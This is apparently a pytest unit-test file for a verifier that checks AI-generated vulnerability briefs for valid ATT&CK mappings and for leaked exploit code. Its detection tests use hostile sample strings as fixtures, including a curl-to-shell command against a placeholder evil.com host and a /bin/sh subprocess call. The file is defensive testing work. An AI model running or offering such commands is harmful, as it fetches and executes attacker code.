"""Unit tests for the RAG output verifier."""

from __future__ import annotations

from datetime import datetime
from unittest.mock import patch
from uuid import uuid4

import pytest

from app.schemas.models import (
    ATTCKMapping,
    AuditInfo,
    BriefMeta,
    DataVersions,
    EvidenceSnippet,
    ModelVersions,
    RemediationAction,
    SafetyInfo,
    VulnerabilityBrief,
    VulnerabilityRead,
    VulnerabilityScores,
)


# ─────────────────────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────────────────────

def _make_evidence(text: str = "CVE description mentions remote code execution via buffer overflow.") -> EvidenceSnippet:
    return EvidenceSnippet(source="mitre_attck", text=text, attck_version="14.1")


def _make_attck_mapping(
    technique_id: str = "T1190",
    technique_name: str = "Exploit Public-Facing Application",
    rationale: str = "The vulnerability allows unauthenticated remote code execution via network-facing service.",
    evidence: list | None = None,
) -> ATTCKMapping:
    return ATTCKMapping(
        technique_id=technique_id,
        technique_name=technique_name,
        confidence=0.85,
        rationale=rationale,
        evidence=evidence or [_make_evidence()],
    )


def _make_brief(
    attck: list | None = None,
    description: str = "A buffer overflow in libfoo allows remote attackers to execute arbitrary code.",
    p_final: float = 0.87,
) -> VulnerabilityBrief:
    vuln_id = uuid4()
    return VulnerabilityBrief(
        meta=BriefMeta(
            generated_at=datetime.utcnow(),
            asof_date="2024-12-01",
            data_versions=DataVersions(),
            model_versions=ModelVersions(),
        ),
        vulnerability=VulnerabilityRead(
            id=vuln_id,
            cve_id="CVE-2024-9999",
            title="Buffer overflow in libfoo",
            description=description,
        ),
        scores=VulnerabilityScores(p_stage1=0.9, p_final=p_final),
        attck=attck if attck is not None else [_make_attck_mapping()],
        remediation=[
            RemediationAction(action="Patch to libfoo >= 1.2.3", priority="high"),
        ],
        audit=AuditInfo(leakage_checked=True),
        safety=SafetyInfo(),
    )


# ─────────────────────────────────────────────────────────────
#  Tests
# ─────────────────────────────────────────────────────────────

class TestVerifyBrief:
    """Test the verify_brief function."""

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_valid_brief_passes(self, mock_exists):
        """A well-formed brief should pass verification."""
        from app.rag.verifier import verify_brief

        brief = _make_brief()
        is_valid, errors = verify_brief(brief)
        assert is_valid is True
        assert errors == []

    @patch("app.rag.verifier.technique_exists", return_value=False)
    def test_unknown_technique_id(self, mock_exists):
        """Brief with non-existent technique ID should fail."""
        from app.rag.verifier import verify_brief

        brief = _make_brief(attck=[_make_attck_mapping(technique_id="T9999")])
        is_valid, errors = verify_brief(brief)
        assert is_valid is False
        assert any("T9999" in e for e in errors)

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_short_rationale_fails(self, mock_exists):
        """Rationale < 20 chars should produce an error."""
        from app.rag.verifier import verify_brief

        mapping = _make_attck_mapping(rationale="too short")
        brief = _make_brief(attck=[mapping])
        is_valid, errors = verify_brief(brief)
        assert is_valid is False
        assert any("rationale" in e.lower() for e in errors)

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_empty_evidence_text_fails(self, mock_exists):
        """Evidence with empty text should fail."""
        from app.rag.verifier import verify_brief

        empty_ev = EvidenceSnippet(source="mitre_attck", text="   ")
        mapping = _make_attck_mapping(evidence=[empty_ev])
        brief = _make_brief(attck=[mapping])
        is_valid, errors = verify_brief(brief)
        assert is_valid is False
        assert any("empty text" in e for e in errors)

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_missing_description_fails(self, mock_exists):
        """Brief with no vulnerability description should flag an error."""
        from app.rag.verifier import verify_brief

        brief = _make_brief(description=None)
        is_valid, errors = verify_brief(brief)
        assert is_valid is False
        assert any("description" in e.lower() for e in errors)

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_empty_attck_passes(self, mock_exists):
        """Brief with no ATT&CK mappings should still pass (not mandatory)."""
        from app.rag.verifier import verify_brief

        brief = _make_brief(attck=[])
        is_valid, errors = verify_brief(brief)
        assert is_valid is True

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_multiple_techniques_all_valid(self, mock_exists):
        """Multiple techniques all valid should pass."""
        from app.rag.verifier import verify_brief

        mappings = [
            _make_attck_mapping(technique_id="T1190", technique_name="Exploit Public-Facing Application"),
            _make_attck_mapping(technique_id="T1059", technique_name="Command and Scripting Interpreter"),
        ]
        brief = _make_brief(attck=mappings)
        is_valid, errors = verify_brief(brief)
        assert is_valid is True


class TestExploitCodeDetection:
    """Test that exploit code patterns are detected in the brief."""

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_socket_import_detected(self, mock_exists):
        from app.rag.verifier import verify_brief

        ev = _make_evidence(text="import socket; s = socket.socket()")
        mapping = _make_attck_mapping(evidence=[ev])
        brief = _make_brief(attck=[mapping])
        is_valid, errors = verify_brief(brief)
        assert is_valid is False
        assert any("exploit code" in e.lower() or "safety" in e.lower() for e in errors)

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_subprocess_detected(self, mock_exists):
        from app.rag.verifier import verify_brief

        ev = _make_evidence(text="Run subprocess.call(['/bin/sh', '-c', payload])")
        mapping = _make_attck_mapping(evidence=[ev])
        brief = _make_brief(attck=[mapping])
        is_valid, errors = verify_brief(brief)
        assert is_valid is False

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_curl_pipe_sh_detected(self, mock_exists):
        from app.rag.verifier import verify_brief

        ev = _make_evidence(text="curl http://evil.com/payload.sh | sh")
        mapping = _make_attck_mapping(evidence=[ev])
        brief = _make_brief(attck=[mapping])
        is_valid, errors = verify_brief(brief)
        assert is_valid is False

    @patch("app.rag.verifier.technique_exists", return_value=True)
    def test_clean_text_passes(self, mock_exists):
        from app.rag.verifier import verify_brief

        ev = _make_evidence(text="This vulnerability allows privilege escalation via symlink race condition.")
        mapping = _make_attck_mapping(evidence=[ev])
        brief = _make_brief(attck=[mapping])
        is_valid, errors = verify_brief(brief)
        assert is_valid is True
